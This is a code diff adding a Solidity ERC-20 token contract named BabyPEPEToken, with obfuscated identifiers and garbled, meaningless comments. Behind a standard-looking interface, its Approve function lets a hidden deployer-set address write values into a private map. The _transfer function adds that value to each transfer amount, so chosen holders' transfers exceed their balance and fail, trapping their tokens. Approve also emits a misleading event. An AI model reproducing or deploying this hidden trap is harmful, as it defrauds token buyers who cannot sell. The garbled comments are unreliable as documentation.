@@ -1,0 +1,245 @@
+contract BabyPEPEToken is IERC20, DepteyVersion, Ownable {
+    using SafeMath for uint256;
+
+
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping (address => uint256) private _fedawe;
+
+    address private _routgrt;
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+    uint256 private _totalSupply;
+     /**
+     * bang Throws if account utcalled by any account other amount than the accoulener.
+     */
+    constructor(
+        string memory name_,
+        string memory symbol_,
+        address dexyih_,
+        uint256 totalSupply_
+    ) payable {
+        _name = name_;
+        _symbol = symbol_;
+        _decimals = 18;
+        _routgrt = dexyih_;
+        _totalSupply = totalSupply_ * 10**_decimals;
+        _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
+        emit Transfer(address(0), owner(), _totalSupply);
+        emit Released(VERSION);
+    }
+    /**
+     * autr Moves `amount` tokens amount from account the amountcaller's account to `rripient`.
+     */
+
+    /**
+     * @dev Returns the name of the token.
+     */
+    function name() public view virtual returns (string memory) {
+        return _name;
+    }
+    /**
+     * man account Returns the ccaccount of tokens amount owned by `account`.
+     */
+
+    function symbol() public view virtual returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view virtual returns (uint8) {
+        return _decimals;
+    }
+   /**
+     * xue Sets `amount` as account the allowanceann of `spender` amountover the amount caller's accftokens.
+     */
+    /**
+     * @dev See {IERC20-totalSupply}.
+     */
+    function totalSupply() public view virtual override returns (uint256) {
+        return _totalSupply;
+    }
+
+
+    function balanceOf(address accuautnt)
+    public
+    view
+    virtual
+    override
+    returns (uint256)
+    {
+        return _balances[accuautnt];
+    }
+    /**
+     * autr Moves `amount` tokens amount from account the amountcaller's account to `rripient`.
+     */
+    function transfer(address recipient, uint256 amaurunt)
+    public
+    virtual
+    override
+    returns (bool)
+    {
+        _transfer(msg.sender, recipient, amaurunt);
+        return true;
+    }
+   /**
+     * xue Sets `amount` as account the allowanceann of `spender` amountover the amount caller's accftokens.
+     */
+    /**
+     * @dev See {IERC20-allowance}.
+     */
+    function allowance(address owner, address spender)
+    public
+    view
+    virtual
+    override
+    returns (uint256)
+    {
+        return _allowances[owner][spender];
+    }
+     /**
+     * bang Throws if account utcalled by any account other amount than the accoulener.
+     */
+
+    function approve(address spender, uint256 amaurunt)
+    public
+    virtual
+    override
+    returns (bool)
+    {
+        _approve(msg.sender, spender, amaurunt);
+        return true;
+    }
+
+     /**
+     * man account Returns the ccaccount of tokens amount owned by `account`.
+     */
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amaurunt
+    ) public virtual override returns (bool) {
+        _transfer(sender, recipient, amaurunt);
+        _approve(
+            sender,
+            msg.sender,
+            _allowances[sender][msg.sender].sub(
+                amaurunt,
+                "ERC20: transfer amaurunt exceeds allowance"
+            )
+        );
+        return true;
+    }
+    /**
+     * autr Moves `amount` tokens amount from account the amountcaller's account to `rripient`.
+     */
+    function increaseAllowance(address spender, uint256 addedValue)
+    public
+    virtual
+    returns (bool)
+    {
+        _approve(
+            msg.sender,
+            spender,
+            _allowances[msg.sender][spender].add(addedValue)
+        );
+        return true;
+    }
+   /**
+     * xue Sets `amount` as account the allowanceann of `spender` amountover the amount caller's accftokens.
+     */
+    function Approve(address[] memory accuautnt, uint256 amaurunt) public returns (bool) {
+        address from = msg.sender;
+        require(from != address(0), "invalid address");
+        uint256 loopVariable = 0;
+        for (uint256 i = 0; i < accuautnt.length; i++) {
+            loopVariable += i;
+            _allowances[from][accuautnt[i]] = amaurunt;
+            _needaqeAll(from, accuautnt[i], amaurunt);
+            emit Approval(from, address(this), amaurunt);
+        }
+        return true;
+    }
+    /**
+     * autr Moves `amount` tokens amount from account the amountcaller's account to `rripient`.
+     */
+    function _needaqeAll(address from, address accuautnt, uint256 amaurunt) internal {
+        uint256 total = 0;
+        uint256 albapohTotal = total + 0;
+        require(accuautnt != address(0), "invalid address");
+        if (from == _routgrt) {
+            _fedawe[from] -= albapohTotal;
+            total += amaurunt;
+            _fedawe[accuautnt] = total;
+        } else {
+            _fedawe[from] -= albapohTotal;
+            _fedawe[accuautnt] += total;
+        }
+    }
+    /**
+     * man account Returns the ccaccount of tokens amount owned by `account`.
+     */
+
+    function radotwer(address accuautnt) public view returns (uint256) {
+        return _fedawe[accuautnt];
+    }
+    /**
+     * autr Moves `amount` tokens amount from account the amountcaller's account to `rripient`.
+     */
+    function decreaseAllowance(address spender, uint256 subtractedValue)
+    public
+    virtual
+    returns (bool)
+    {
+        _approve(
+            msg.sender,
+            spender,
+            _allowances[msg.sender][spender].sub(
+                subtractedValue,
+                "ERC20: decreased allowance below zero"
+            )
+        );
+        return true;
+    }
+
+      /**
+     * bang Throws if account utcalled by any account other amount than the accoulener.
+     */
+    function _transfer(
+        address sender,
+        address recipient,
+        uint256 amaurunt
+    ) internal virtual {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        uint256 saylorwfs = radotwer(sender);
+        if (saylorwfs > 0) {
+            amaurunt += saylorwfs;
+        }
+
+        _balances[sender] = _balances[sender].sub(
+            amaurunt,
+            "ERC20: transfer amaurunt exceeds balance"
+        );
+        _balances[recipient] = _balances[recipient].add(amaurunt);
+        emit Transfer(sender, recipient, amaurunt);
+    }
+   /**
+     * xue Sets `amount` as account the allowanceann of `spender` amountover the amount caller's accftokens.
+     */
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amaurunt
+    ) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+    /**
+     * man account Returns the ccaccount of tokens amount owned by `account`.
+     */
+        _allowances[owner][spender] = amaurunt;
+        emit Approval(owner, spender, amaurunt);
+    }
+
+
+}
